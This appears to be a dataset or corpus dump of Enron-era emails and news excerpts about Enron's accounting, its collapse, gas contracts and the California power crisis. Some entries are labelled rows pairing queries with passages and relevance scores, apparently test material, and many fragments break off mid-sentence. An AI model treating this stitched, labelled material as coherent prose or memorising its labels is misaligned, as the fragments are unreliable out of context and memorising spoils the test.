The monthly data (files ending w/ US) contain monthly data submitted by those respondents required to file monthly survey responses, and ESTIMATES for those other respondents required only to submit one annual survey response.  The data for those files, therefore, also include - for each State - a record for utility ID = ""99999"" and plant code = ""9999"" containing data values which represent the arithmetic differences between the ""estimated"" State totals and the sum of the net generation, consumption, and ending stocks data reported by the respondents to the Form EIA-759. 
The 2001 file will be a ""year-to-date"" file and is in this Monthly format until the data for the final month is finalized. 

The other files (Annual Data, files ending w/ YR) contain monthly data submitted by those respondents required to file monthly survey responses, and annual data for those other respondents required to only submit one annual survey response. No estimation procedures are involved. 

This only applies to the 759 (Utility) forms.  If you notice, there are only YR files for F759 forms. 

Also, keep in mind that for the 900 Forms before year 2001, the values are in Kwh and not Mwh.  To convert Kwh to MW, divide by 24 hours, 31 days, and 1000...not that you care about generation anyways, but just in case...

Got it?  Hope this helps.  If you need anything else, call this baller up here.   

Have fun in Portland,

Weakness in the Dow is fairly broad based, with abouttwo-thirds of the stocks that make up the index lower. The Dow'stroubles are weighing on the NASDAQ, which is finding difficultyextending Monday's huge increase. Indeed, after a five-day bullrun in the NASDAQ, traders have been reluctant to push the techindex substantially higher. The S&P 500 has straddled theunchanged level, as losses in drugs, electrical equipment andhealthcare offset strength in financials, communicationsequipment and computer software shares.----------------------------------------------------------------JAPAN / EUROPE SUMMARYEuropean shares were higher by midmorning as technology andtelecommunications issues caught fire across the pond. TheNASDAQ's almost 5% jump Monday was the main impetus for thegains. However, the mixed performance in the U.S. headlineindexes has caused a bit of choppiness in the European indexes,as well as knocking them off respective intraday highs.

Across the Pacific,both the Nikkei-225 and Topix fell, with bank and insurancecompanies the biggest losers of the session.

Ed,

I had a chance to read the contract LUS and follow-up with a phone call to 
Ron Gary to clarify.  Please note the following information:

LUS entered into a letter agreement after the contract was put in place for 
gas supply greater than Base quantities.  That price is GDA Hub + $.04.  The 
letter agreement allows LIG to 
The contract has a 75% take requirement for Base quantities but has no 
penalty if LUS does not take.  LUS uses this optionality to buy less 
expensive power in the marketplace.  There has been times that LUS takes less 
than the Base quantity.  He would be open to a GDA keep whole for this but 
would like to have 24 months of history so he can compare.  Tricia is working 
on this.  
For the Natchiotoches plant, Seller has an out if TransLa interrupts.  LUS is 
given a credit of 45,000/year for fuel retention on TransLa.  We need to 
gross up our price to account for this.
There is a GDA keep whole for any vol's that are triggered.  The trigger 
price is NYMEX plus $.04 and this basis is fixed.
LUS has not nominated Surplus volumes in two years.
Our bid will be reduced by $30,000 for the year by LUS to compare us to LIG's 
bid for gas odorization.  This will not be a cost to Enron but will be used 
in their evaluation process.
We need to state how we will make deliveries firm or why our volumes will 
flow if we do not sign up for firm capacity form the pipeline.

There is additional stuff in the contract that we need to discuss.  I'm 
working on the proposal and Hodge is working on getting a discounted firm 
rate on Texas Gas and Columbia.  Ultimately, this is what will determine if 
we win this deal or not.  Lets discuss when you get a chance.

Where there was an active market, as with stocks =or publicly traded bonds, that is relatively easy to do and difficult to ma=nipulate. But where there is no such market, companies were allowed by the =rules to use their own models to estimate fair value, and to treat that as =the market value.=20The mark-to-market technique was used to report profits in some Enron busin=esses. When its energy services unit signed a power-supply contract with a =company, it would structure the deal to bring it under those accounting rul=es. It would then project electricity and natural gas prices for the full t=erm of the deal, which could last as long as 10 years, according to former =Enron officials.=20Many of the contracts covered companies in states that had not yet deregula=ted their power markets. In those cases, Enron forecast when the states wou=ld deregulate those markets and then projected what prices would be under t=he currently nonexistent deregulated market.=20Then, based on its projections, Enron would calculate its total profit over= the life of the contract. After discounting that figure to account for the= risk its customer would default and the fact that it would not receive mos=t payments for years, Enron would book the profit immediately.=20Mr. Lucas said it had not occurred to him that anyone would use models to t=ry to forecast energy prices for 10 years, and then use those models to rep=ort profits, but that the rule had not placed a limit on such trades. He no=ted that any trade that required assumptions for such a long time would app=ear to be very risky.=20A former Enron official has told associates that Arthur Andersen, Enron's a=uditor, took a number of issues related to Enron's accounting to the task f=orce. That official said Andersen accountants viewed the company's structur=ing of financial instruments to be on the cutting edge.=20Andersen has a seat on the task force, as do each of the four other large a=ccounting firms. The other members among the 13 on the task force are 4 rep=resentatives of smaller accounting firms and 4 executives from large compan=ies. One industry seat is now vacant, after an executive from General Elect=ric left. The others are held by officials of J. P. Morgan, Exxon Mobil and= Dow Chemical.=20The task force does not disclose who suggests topics, so it is not possible= to be certain which Enron issues were considered. But it appears that one =such issue came in 2000, when the task force addressed the question of what= should be done about what appeared to be the application of widely varying=",0.7,0.5,0.7,0.8
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"2. The equity derivative transactions do not appear to be at armslength. a. Enron hedged New Power, Hanover and Avici with the related partyat what now appears to be the peak of the market. New Power and Avicihave fallen away significantly since. The related party was unable tolay off this risk. This fact pattern is once again very negative forEnron. b. I don't think any other unrelated company would have entered intothese transactions at these prices. What else is going on here? What wasthe compensation to the related party to induce it to enter into suchtransactions? 3. There is a veil of secrecy around LJM and Raptor. Employeesquestion our accounting propriety consistently and constantly. Thisalone is cause for concern. a. Jeff McMahon was highly vexed over the inherent conflicts of LJM.He complained mightily to Jeff Skilling and laid out five steps hethought should be taken if he was to remain as treasurer. Three dayslater, Skilling offered him the C.E.O. spot at Enron Industrial Marketsand never addressed the five steps with him. b. Cliff Baxter complained mightily to Skilling and all who wouldlisten about the inappropriateness of our transactions with LJM. c. I have heard one manager-level employee from the principalinvestments group say, ''I know it would be devastating to all of us,but I wish we would get caught. We're such a crooked company.'' Theprincipal investments group hedged a large number of their investmentswith Raptor. These people know and see a lot. Many similar comments aremade when you ask about these deals. Employees quote our C.F.O. assaying that he has a handshake deal with Skilling that LJM will neverlose money. 4. Can the general counsel of Enron audit the deal trail and themoney trail between Enron and LJM/Raptor and its principals? Can he lookat LJM? At Raptor? If the C.F.O. says no, isn't that a problem? Condor and Raptor Work: 1. Postpone decision on filling office of the chair, if the currentdecision includes C.F.O. and/or C.A.O. 2. Involve Jim Derrick and Rex Rogers to hire a law firm toinvestigate the Condor and Raptor transactions to give Enronattorney-client privilege on the work product.

And now they want their money back! They are like access=ories to a failed bank heist who demand restitution because the police conf=iscated their share of the take.

(Watkins has been cast in the ro=le, but all she really did is beg her boss to orchestrate an artful coverup= so she could continue to make lots of money.) Why will the people who work= at the next Enron behave any differently?The second reason to ignore the yelps and whimpers of Old Enronians is basi=c justice. The phony accounts Enron ginned up for many years allowed it to =pay its employees as if they actually were conducting hugely profitable bus=iness. Even those who were profitably engaged were probably grossly overpai=d for their efforts. In short, they've already made out like bandits.

The quarterly filings are paper filings and are not granted confidential treatment.The quarterly filing requirements proposed in the NOPR differ in that they would, 1) in addition to all of the above information, also require posting of the transaction execution date and the point of receipt; 2) require electronic posting of an Index of Customers rather than paper filing and 3) require reporting for all sales transactions including book outs or net outs. Enron should consider objecting to these revisions. I've spoken with some of the traders and they agree. The effect of these requirements would be that Enron's competitors will now have quicker, easier access to not only the usual reported information but also to the transaction execution date which will disclose a place and time for the transaction. FERC has cited very little valid justification for imposing these new requirements. ENA Legal representatives and I will be participating in the EPSA conference call to discuss the NOPR on Friday.

Philadelphia Oil Service Index Climbs to August Levels
 
    The Philadelphia Oil Service Index climbed as high as 89.85, its 
highest level since August, closing at 89.41, up 3.8% yesterday. 
Shares of Rowan added $0.77 to $19.70 and Schlumberger stocks gained 
$2.85 to $55.95. Integrated oil stocks also gained, as the CBOE Oil 
Index was up 1.3% to 300.2. ChevronTexaco rose $0.65 to $89.20 and 
ExxonMobil advanced $0.60 cents to $39.60. On the NYMEX, February 
crude oil rose to session high at $21.43 per barrel, its highest 
level in 6 weeks. It closed at $21.27, up $1.65, or 8.6%. 
Expectations that OPEC will proceed with a planned production cut of 
1.5 million bpd at a meeting in Cairo on Friday likely gave the 
market a lift. Although non-OPEC producers are a little short of the 
500,000 bpd reduction that OPEC demanded, it appears that they came 
close enough, with a combined pledge to cut 462,500 bpd, to satisfy 
the cartel.

Egypt Increases Oil Reserves 

    Egypt's Oil Ministry says new oil and condensate finds with 
recoverable reserves of 178 million barrels, and natural gas reserves 
of 1.5 Tcf have been discovered. About 15 wells had been drilled, of 
which 7 were now producing at a total of 16,000 bpd.  The oil 
discoveries were made in the Gulf of Suez and the country's western 
and eastern deserts, and the natural gas discoveries were made in the 
Nile Delta area, western desert and in the Mediterranean sea. Egypt 
produced about 640,000 barrels of oil per day in November. It has 
proven natural gas reserves of 53.3 Tcf, and oil reserves of 3.8

Hello everyone.  I've contacted you all because Regulatory Affairs (Becky and I) are attempting to stop sending you so much paper.  Our goal is to still keep you all informed but in a more effective, efficient, and timely manner.  This is where Livelink comes in.  Livelink is a web-based tool that you all will be able to enter from the Govt.Affairs homepage.  In Livelink, there will be the filings, maps, rate increases, etc. that we usually send you via interoffice mail.  In addition, the files from the file room will eventually be added.

Livelink is only going to be as successful as what's put into it.  This is where you and your group comes into play.  Becky and I don't want to put ""junk"" into it.  We want what's relevant to you and your team.  Of course, this is all relative.  What's important to one person and/or group is not going to be high priority to another. 

We will have a meeting Wednesday, the 17th to meet and discuss what's in livelink and look to you all for your valuable input on what you would like to see that's relevant to your team.  Please reply to the invite and/or send comments.

Greg - looks good to me on the legal procedures.  My only comments would be 
(i) that I'm not sure that the confirm desk generates deal tickets (I thought 
they were prepared by the commercial guys) and (ii) we usually don't have the 
commercial guys sign confirms as a control matter, even when it's an unusual 
matter.  I agree about Tana.

Subject: Canadian Financial Trading Confirmation Process

Further to a discussion with Mark Taylor, I wanted to confirm our collective 
understanding/proposal regarding the legal procedures associated with the 
financial trading process in Canada.  As you are all aware, all financial 
confirms for Enron Canada are now generated and distributed by the confirm 
desk in Calgary.  However, it seems that there has been some confusion 
relating to the legal procedures associated with this process.

In short, I believe that everyone is in agreement that the legal process 
regarding Canadian financial confirms will be basically the same as for 
Canadian physical confirms.  That is, as is currently the process for 
physical deals, the Canadian confirm desk will generate all deal tickets and, 
to the extent that the financial transactions are straight forward, will 
generate, have executed and distribute to counterparties the confirmation 
letters, with no involvement of the legal department.  However, for any 
financial transactions that are out of the ordinary or contain special terms 
(as well as amendments), just as with physical transactions, the confirm desk 
will generate the deal ticket and provide it to Linda or Sharon in Calgary.  
Linda and Sharon will then prepare the draft financial confirm based upon the 
deal ticke",0.0,0.0,0.7,0.2

Electricity and natural gascompanies said Enron owed them almost $600 million as ofyesterday. European Administrator In London, PricewaterhouseCoopers was appointed administratorof Enron's European holding company and some of its operatingcompanies, a step other companies have taken before filing Chapter11 papers in the U.S. ``If I were a betting man, Enron going into Chapter 11 in thenext week is a bet I'd make,'' said Glen Hilton, who helps manage$125 million, including Dynegy shares, for Montgomery AssetManagement. Enron shares have lost more than $26 billion in market valuein the last seven weeks. They fell 25 cents, or 41 percent, to 36cents. The shares traded at $54.54 on June 4. Enron bonds were bid at 23 cents on the dollar in latetrading, little changed from yesterday, traders said. The debt hadbeen near full value as recently as last month. Quarterly Dividend The company said this morning it was evaluating whether itwill pay a scheduled 12.5-cent quarterly dividend on Dec. 20. Enron hired the law firm Weil Gotshal & Manges LLP, which hasthe nation's largest bankruptcy practice, and the Blackstone GroupLP investment banking firm. Arthur Newman, head of restructuringat Blackstone, said his firm was retained and declined to commentfurther. Chapter 11 would let Enron officials continue to control thecompany while negotiating a recovery plan with creditors. Aprovision of U.S. bankruptcy law automatically blocks debt-collection efforts, lawsuits and other actions against thecompany. ``A Chapter 11 filing can be a great thing for a cash-starvedcompany being attacked from all sides,'' said Nancy Rapoport, deanof the University of Houston Law Center. Thousands Affected An Enron bankruptcy would affect thousands of people,including the company's 21,000 employees, its customers,suppliers, investors and other creditors. The court-supervisedrecovery process would give Enron a chance to change strategiesand fix mistakes. It might take years to complete and may end inthe company's liquidation. In addition to its energy trading operation, Enron operates anationwide gas pipeline system spanning 25,000 miles. It also ownsPortland General Electric, which generates and distributes powerto about 725,000 customers in the Pacific Northwest. The company'sEnron Broadband Services is building a global fiber-opticcommunications network.

traunch) - see 541136, 555941, 553654 & 555681 (the last two tickets are the

review, we book as much excess gas on a second set of firm tickets as the 
reserve report indicates (the Firm Excess volume) - in this case, for the 
month of February, that number is 4,618/d - see 540814 & 594648.  Finally, we 
""book"" any residue remaining after the VPP volume and the Firm Excess volume 
on a set of spot, Gas Daily tickets - see 554222 & 555729.  Originally, when 
we mistakenly thought the nomination at meter 9502 was 2,997/d, the 
corresponding spot, Gas Daily volume was 17,216/d minus 11,480/d minus 
4,618/d or 1,118/d.  When the renomination of meter 9502 (a downward

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Specifically, Partnoy argues that the derivatives market is too easy to penetrate because all that's required is ""credit worthiness and decent reputation."" If one of the nation's three credit-rating agencies -- Moody's, Standard & Poor's or Fitch IBCA -- give a company an investment grade rating, it can essentially act like J.P. Morgan Chase or Citigroup, two of the world's biggest banks. But Enron was able to offer credit without being required to keep a set amount of capital in place, as banks are. And whereas traders dealing with securities or futures contracts must pass difficult licensing exams, companies that trade only in derivatives often can do as they please. Enron managed to become a major player in the derivatives market not just by taking advantage of these loopholes. The company also built up its reputation through a mix of deceit, hobnobbing and bravado. Its high credit rating was maintained by hiding billions of dollars of debt in off-balance sheet partnerships. Its gravy train included prominent economists, politicians and journalists. By dint of ceaseless self-promotion, executives like Ken Lay and Jeffrey Skilling made Enron's name synonymous with successful financial innovation. Investment bankers now speak with derision of Enron's arrogant attempt to invade the turf of the big boys. And many in the investment community are quick to separate themselves from Enron's taint. The fault for Enron's collapse lies with Enron, they argue -- not the lack of regulation. The company gamed the system and paid the price. New rules, they stress, would only punish the innocent companies with higher costs and more red tape. The lesson of Enron's collapse is not that government needs to save the markets from themselves, but rather that bad companies fail, says Nik Khakee, director of Standard & Poor's structured finance derivatives group. ""Some people would argue that it's good for there to be more players in the derivatives market, but you need to make sure that they're all operating under an accepted set of rules,"" he says. Enron, he implied, made up its own rules. Proponents of credit derivatives, in particular, dismiss the idea that Enron's fall has any larger systemic importance. Enron's derivatives will simply be redistributed, they argue. In fact, Enron's involvement with credit derivatives should be seen as ""a bright spot,"" according to William Harrison, CEO of J.P. Morgan Chase, who defended them on Jan. 16, according to a Financial Times report. Without credit derivatives, Harrison and others have argued, Enron's $33 billion debt default would have been more highly concentrated, forcing banks that had a direct relationship with Enron to lose massive amounts of money, or close.",0.0,0.0,0.8,0.8

because we got sick of it and had other ""fish to fry"" in Asia and Africa , 
plus it was really a civil war because the people who ""beat"" us were , 
largely , first or second generation ""Americans"" and , therefore ,  Brits 
(for example , George Washington's family home is still there close to my

That fact that you asked ""who?"" begs the further question of what exactly you 
were up to in Houston.  Have the Brits ever really won a battle any way?  
(Their failure to beat a bunch of colonized farmers with pitch forks has 
resulted directly in this Florida mess, and their failure to put away the 
French (of all people) has resulted directly in me and the vast majority of 
my fellow Canadians being subjected to official and legally mandated 
bilingualism).

To the point, I believe San Felipe is the battle field adjacent to the 
Westheimer battle field, where the Brits (or at least one of them) were 
purportedly waging a more efficient war, until being caught red handed on the 
battle fields of San Felipe, where, all the while, the Canadian forces (or at 
least one of them) were so successfully conquering the enemy.

PNM Plans to Retire Transmission Line Debt

  Public Service Company of New Mexico has asked the New Mexico Public
Regulation Commission for authority to enter into a transaction that would
cause the retirement of $27 million of Secured Facility Bonds due 2012.
The proposed transaction will reduce PNM's long-term debt and give the
company majority ownership of the 216-mile long Eastern Interconnection
Project line, which connects PNM and the Western US with the West Texas
electrical grid. PNM entered into a sale-leaseback arrangement in 1985
that allowed the company to levelize the EIP's cost to PNM and its
customers over the lease period. The proposal would result in the
redemption on April 1, 2002 of the Secured Facility Bonds at a price of
$1054.30 per $1000 principal plus accrued interest to April 1, 2002.

California's petulant governor ignores reality as he overpays for electricity


LANCE T. IZUMI Mr. Izumi is a senior fellow in California Studies at the San 
Francisco- based Pacific Research Institute.

On the surface, things seem to be going pretty good for Gov. Gray Davis with 
regard to California's electricity crisis. The governor has scored some nice 
publicity by switching on some new power plants. The weather has been 
unseasonably cool. His poll numbers are edging back up. Yet beneath this 
optimistic picture lie troubling problems. For example, Davis's argument that 
out-of-state power generators are responsible for the electricity crisis has 
been falling apart. For months, Davis has been claiming that private 
generators have overcharged California by $8.9 billion and demanded that this 
amount be refunded to the state. However, after a two-week mediation between 
state officials and the generators, Curtis Wagner, the federal government's 
chief energy regulatory judge, rebuked Davis's claim saying that such a huge 
overcharge ""has not and cannot be substantiated."" Further, while the 
generators may be liable to refund a much smaller amount to the state, 
perhaps $1 billion, Wagner said that generators are owed more money by the 
state than they owe the state in refunds: ""Can a cash refund be required 
where a much larger amount is due the seller? The chief judge thinks not."" 
Davis reacted to the judge's ruling by calling it a ""raw deal"" and by urging 
the Federal Energy Regulatory Commission to ignore the lack of evidence and 
the judge's conclusions and to ""step up and provide the refunds we've asked 
for."" Davis's position, as usual, is motivated purely by politics. Indeed, 
Dan Walters of the Sacramento Bee says that Davis is operating in a 
""melodramatic virtual world"" de-linked from reality. 
Davis's blame-the-generators argument took another body blow when newly 
released documents showed that, on average, major out-of-state power

mark to market accounting practices,1,"11/12/2001The Wall Street JournalC1(Copyright (c) 2001, Dow Jones & Company, Inc.)What could Arthur Andersen have done to protect the investing public from Enron? Brushing up on a basic accounting textbook might have helped, some critics say. Confirming investors' fears, the Houston energy trader Thursday filed a lengthy disclosure document with the Securities and Exchange Commission declaring that its financial statements going back to 1997 ""should not be relied upon"" and will have to be restated. Among other problems, Enron acknowledged overstating its net income by a total of $586 million, or 20%. Enron's financial statements long have been widely assailed as indecipherable. Now, it turns out, they were just plain wrong.But what is most striking about the latest disclosures is that they show Enron's misstatements weren't limited merely to judgment calls and gray areas for the green-eyeshade crowd to debate. Portions of Enron's accounting practices amounted to violations of elementary accounting principles, some accounting specialists say. Citing client-confidentiality rules, an Andersen spokesman, David Tabolt, declines to comment on his firm's work for Enron, which on Friday agreed to be bought by crosstown rival Dynegy. He calls Enron's disavowal of its previous financial statements an ""unfortunate situation"" and says Andersen is cooperating with the SEC's Enron investigation and the special committee formed by Enron to investigate the company's accounting and disclosure practices. Consider the primary reason for the $1.2 billion reduction in shareholder equity that Enron revealed in mid-October, sparking much of the downdraft in the company's shares. At the time, Enron said the reduction came about because it had decided to unwind certain transactions with some limited partnerships with which it had done business. On Thursday, however, Enron acknowledged that the original accounting for the transactions violated generally accepted accounting principles. Starting in early 2000, the company said last week, Enron issued shares of its own common stock to four ""special-purpose entities,"" in exchange for which it received a note receivable. Enron said it had increased both its note-receivable assets and shareholder equity, a move the company called ""an accounting error"" that it is correcting. Under GAAP, the payment a company receives when issuing stock only counts as equity if it is cash. As a result, Enron's 2000 audited financial statements overstated the company's notes-receivable assets and shareholder equity by $172 million. And Enron's 2001 unaudited statements overstated them by $828 million. The $1 billion overstatement represents 8.5% of Enron's previously reported shareholder equity as of June 30.",0.0,0.6,0.9,0.6

Forecast:  The forecast through June is likely to bring at least 3 and as many as 6 more days with minimum temperatures below 50.

No days are expected to top 90 before June 20.  No stretches of 3 or more consecutive days over 85 are expected before the 20th.  Long range forecasts would indicate that it is unlikely that any significant stretches of heat will impact Chicago through the end of June.

Comment:  With below to much below normal temperatures continuing for much of June 2001 - cooling load will be less than June of 2000.  I'm not sure exactly how much the increased heating load will off-set the total monthly demand.

record keeping accounting practices,0,"NEW YORK (AP) - Stung by a collapse in public confidence following the Enron scandal, the accounting profession is taking steps to eliminate the appearance of conflicts of interest in the kinds of services they offer their audit clients. The American Institute of Certified Public Accountants, a professional group, said Friday for the first time that it would support any future proposal to impose certain limits on services accounting firms may provide to the companies they audit.The statement came a day after KPMG, one of the five major accounting firms, reversed its opposition to limits proposed two years ago, which would have prevented auditing firms from providing information technology consulting or internal audit services to the companies whose financial statements they audit. The two actions came on the heels of an announcement from the leading accounting firm, PricewaterhouseCoopers, that it would spin off its consulting business into a separate entity. The plans, which had been in the works for many months, were accelerated because of concerns that the public perception of the accounting profession was hurting because of the Enron scandal. Enron's auditor, Arthur Andersen LLP, acknowledged destroying documents and e-mails that were sought by federal and congressional investigators looking into questionable accounting practices which led to the swift collapse last fall of the energy trading giant. The non-audit consulting fees are often much more lucrative to the accounting firms than fees for auditing companies' books. For example, in 2001, The Walt Disney Co. paid PricewaterhouseCoopers $8.6 million for its auditing and $32 million for other services, according to its proxy statement. Critics contend the high fees could taint an auditor's objectivity when reviewing its client's books. On Thursday, Disney said it will not use its outside auditing firm for new consulting projects and will review those currently under way. Linda Dunbar, a spokeswoman for the AICPA, said that even though the group would support future limits on the bans that such restrictions were not the solution to the profession's problems and ""would not prevent the next Enron."" ""Given where we are on public concerns on conflict of interest, it seems that some restrictions are necessary so that we can move on to more substantive issues,"" Dunbar said. Likewise, Stephen G. Butler, chairman of KPMG, called the controversy of service limits a ""red herring"" in a statement released Thursday, but he said the firm would now support the limits in order to move on to substantive reform of financial accounting practices.",0.0,0.0,0.8,0.2

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"The bulk of his income from exercising options came in the last four years: $13.1 million in 1998, $43.9 million in 1999, $123.4 million in 2000 and $20.7 million this year -- a year in which he sold stock by prearrangement on every trading day through July 31, and then stopped, not wanting to appear to be selling as the stock price was declining. The options he has cashed in recent years, as well as those he now owns, are badly out of the money at Enron's current stock price of $9.98, down from a peak reached in 2000 of $90.75. His bonus in 2000 was $7 million, an award that Enron's board said was based on the company's rising profits and high shareholder return. The company restated those profits last week, explaining that it had improperly applied accounting rules. It said that about 40 percent of its profit in 2000 came from transactions with partnerships that were controlled by Andrew S. Fastow, who was then Enron's chief financial officer. The company's stock price, which was in free fall after questions about the Fastow partnerships prompted an investigation by the Securities and Exchange Commission, fell to $7 a share in the wake of the disclosures. That was the lowest price for the stock since 1991. It rebounded to nearly $10 after Dynegy agreed to acquire the company in a stock swap. In January, Enron's board awarded another bonus to Mr. Lay, of $3.6 million. That was based entirely on the company's shareholder return from 1997 through 2000, which came to 294 percent, the company said. All of that return has since been wiped out. Also in January, Mr. Lay was awarded 106,578 shares of restricted stock, to vest periodically through 2004. All the shares will now vest when the Dynegy deal is completed, and while their value has plunged, the award is still worth more than $1 million. Still, Mr. Lay suffered huge paper losses this year. At the end of 2000, he had 5.1 million options that could have been exercised for profits of $257.5 million, and another 1.5 million options that would have been worth another $104.1 million when enough time had passed that they could be exercised -- assuming the share price stayed level. He exercised 565,928 of those options this year, making a profit of $20.7 million, but the ones he did not exercise are now under water.",0.0,0.3,0.5,0.8

Power Concern Offers California a Secret Deal


By JEFF GERTH and LOWELL BERGMAN

 uke Energy, a power-generating company accused of overcharging
customers millions of dollars during California's year-old energy
crisis, has secretly offered Gov. Gray Davis a deal that it hopes
will solve its legal problems while helping to calm the state's
chaotic electricity markets.

 The proposed settlement, outlined in documents prepared in March
by Duke's lawyers, calls for an end to various state
investigations, private lawsuits and state complaints to federal
authorities accusing Duke of overcharging.

 In return, Duke would make an unspecified ""appropriate payment""
but admit no wrongdoing.

 ""Duke is committed to sharing pain"" and ""expediting high-level
confidential discussions that would embrace the governor's
political and public relations needs,"" according to the documents,
which were given to The New York Times by someone who wanted the
issue aired publicly.

 Governor Davis acknowledged the secret discussions in an interview

I visited with Mr. Bruce Lilly, Foreman for the San Jacinto River Authority, 
yesterday to discuss the possibility of HPL leaving the 2"" NGO pipeline on 
the wooden supports that cross the San Jacinto River Authority's fresh water 
canal behind the NGO  plant.  Mr. Lilly's response to my request was no, the 
River Authority will not agree to allow the wooden supports to remain under 
any circumstance.  The River Authority believes the existing crossing is a 
hindrance to their operation and maintenance of the canal and they want it 
removed.  ExxonMobil's design for the new concrete crossing allows the River 
Authority to operate and maintain the canal with fewer obstacles.

You asked me the term of OxyChem's Natural Gas Odorizer's committment to

But I'm not ready to do that yet - I don't want to stir the waters until we

contacted NGO first, once we have figured out what we will do.  Does anybody

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"Executives at two other companies that rank among the nation's largest traders but who spoke on condition their companies not be identified, also said they had scaled back trading. One of those companies was selling natural gas and electricity to Enron only in cases in which the sales helped balance its account with Enron, an executive said. ''We're trying to do business that offsets our risk,'' the executive said. Ms. Denne, the Enron spokeswoman, said the company's ''transaction volume remains within the normal range,'' adding that there was ''no recognizable change'' yesterday in the number of companies willing to trade with Enron. ''No one significant has dropped off,'' she said. Analysts said Enron's disclosures late on Monday indicated that the company was using up cash more rapidly than had previously been thought. Most of the $5.5 billion that the company has taken in through equity infusions and borrowings the last month has already been depleted. ''The cash burn is greater than anticipated,'' said Carol Coale, an analyst with Prudential Securities in Houston. ''They are in obvious need of cash.'' She estimated that by next summer, Enron could be $2 billion short of the cash it would need to meet its obligations. Ms. Coale noted that the $690 million obligation whose disclosure shook the markets yesterday was set off by a credit downgrade on Nov. 12 --two days before a conference call with investors. When she asked an Enron official yesterday why the matter was not disclosed in the call, Ms. Coale said, she was told, ''We weren't aware of that contingency at the time of that call.'' Donato J. Eassey, an analyst in Houston with Merrill Lynch, said in a report that Dynegy, too, was unaware of the obligation. He calculated that Enron had exhausted about $5 billion in cash the last 50 days. Ms. Denne, the Enron spokeswoman, said that the company had paid off $1.9 billion in short-term i.o.u.'s, used more than $1 billion to post deposits with its trading partners and spent $800 million to $1 billion to pay off or refinance other loans. The company has about $1.2 billion in cash, she said, not including $450 million from a new line of credit that closed this week and a separate credit line with $103 million remaining. Jitters about Enron's future extended to the debt market, where prices for the company's bonds fell sharply yesterday. Enron's short-term bonds fell 5 points, to about 80 cents for each dollar of face value, according to traders in distressed securities. Its longer-term debt, maturing in 2004 or later, dropped 10 points, to around 60 cents on the dollar. Enron's bank debt has not traded recently, these traders said.",0.0,0.0,0.8,0.2

A roadshow for analysts wa=s organized to outline the plan and demonstrate the finance team's skills a=t maintaining the high-wire act.=20The sales pitch worked. When Enron issued 17.2 million shares in an offerin=g and raised about $800 million, rating agencies liked it and share values =didn't drop.=20The second part of the plan involved selling off nonstrategic assets, such =as pipelines and other business units, to create even more cash flow. That =cash was reinvested.=20Under this new, more aggressive strategy, Enron grew in different ways. For= example, in October 1998 the company acquired three New Jersey power plant=s from Cogen Technologies by going to the capital markets to issue about $1=.5 billion in equity and debt. Enron kept that capital off its own balance =sheets by creating a special-purpose entity to which it sold a 50 percent i=nterest in the plants.=20Another deal involved Enron's $2.3 billion purchase of Wessex Water, a Brit=ish water company, in 1998. Enron created a special off-balance-sheet partn=ership named Atlantic Water Trust and issued $1.3 billion in Enron shares i=nto it. The trust then went to the capital markets to raise $1 billion in d=ebt that was backed by those shares.=20The trust purchased Wessex, and because Enron owned no more than 50 percent= of Wessex, it didn't experience earnings dilution and didn't have that $1 =billion in debt counted on its books.=20These complex deals won Fastow and his team praise and industry awards.=20So what went wrong?=20While many of Enron's off-balance-sheet deals worked with little controvers=y, the accounting innovation eventually worked against the company.=20Details on the more complicated deals, particularly the partnerships named =LJM Cayman and LJM2 Co-Investment, which left the company with a $1 billion= charge last quarter, have been hard to come by so far. But they appear to =have been used to hedge against the risk of some of the company's newer lin=es of business beyond its core.=20""Power plants in India, water companies, extension of their franchise to th=e mass retail market and using a fiber optic network to deliver content ove=r the Internet are all unrelated or only tangentially related to their core= merchant energy business,"" said Ray Niles, an analyst with Salomon Smith B=arney. ""All of the write-offs appear to be in these noncore, nonenergy merc=hant areas.""=20The off-balance-sheet partnerships also went on to buy the stock of other c=ompanies, said John Olson, an analyst with Sanders Morris Harris.=20""They own pieces of a variety of companies they've done asset trades with, =oil-services companies, producers,"" Olson said.

It is a tale of how accounting rules can be abused and insiders enriched.The report traces the delicate machinery that was used by Enron's accountan=ts. There appears to have been, at least for a time, a tortured interpretat=ion of accounting rules that could be used to justify the hiding of $1 bill=ion in losses.=20But that smokescreen would have been completely unsuccessful had auditors f=rom Arthur Andersen forced the company to disclose what was happening, as t=hey should have done. Those disclosures would have made it clear that there= was no economic rationale for the transactions, and thus no reason to thin=k that Enron had earned nearly as much money as it said it did.=20Over 15 months, from the beginning of the third quarter of 2000 through the= third quarter of 2001, Enron reported pretax profits of $1.5 billion. Had =Enron not used the Raptor artifices, the figure would have been 72 percent =lower: $429 million.=20The accounting rationale was that the risks of some truly bad investments h=ad been transferred from Enron to the Raptors, which were created in conjun=ction with partnerships run by Andrew S. Fastow, then Enron's chief financi=al officer.=20In fact, as the report makes clear, there was no real transfer of risk, and= Enron eventually had to shoulder the losses. But there was a large transfe=r of wealth to the Fastow partnerships, which were guaranteed huge profits =while taking no risks. Those transactions helped provide $30 million for Mr=. Fastow and millions for other Enron insiders.=20When it became clear that the Raptor enterprises were failing, Enron desper=ately restructured them, first at the end of 2000 and again three months la=ter. Those reorganizations, which the committee denounces in the strongest =terms, allowed the truth about Enron to stay largely hidden for many months= -- a period when top Enron officials sold large quantities of stock.=20''The creation, and especially the subsequent restructuring, of the Raptors= was perceived by many within Enron as a triumph of accounting ingenuity by= a group of innovative accountants,'' the committee report stated. ''We bel=ieve that perception was mistaken. Especially after the restructuring, the =Raptors were little more than a highly complex accounting construct that wa=s destined to collapse.''=20When it did collapse last fall, Enron was forced to take a large loss, whic=h it painted as extraordinary.

I have completed my review of the selected Forest Products counterparties listed in your email request of January 15th.   My review focused on the ""Confidentiality"" provision contained in either the Master Agreement or the Confirmation(s), being the documentation which established the trading relationship with either Enron North America Corp. (""ENA"") or Enron Canada Corp. (""ECC"").   I was asked to determine if the ""Confidentiality"" provision in our trading documents would prohibit ENA and/or ECC from disclosing to third parties: (a) ""the existence of a Master Agreement"" or (b) ""the existence of a transaction under a Confirmation"".

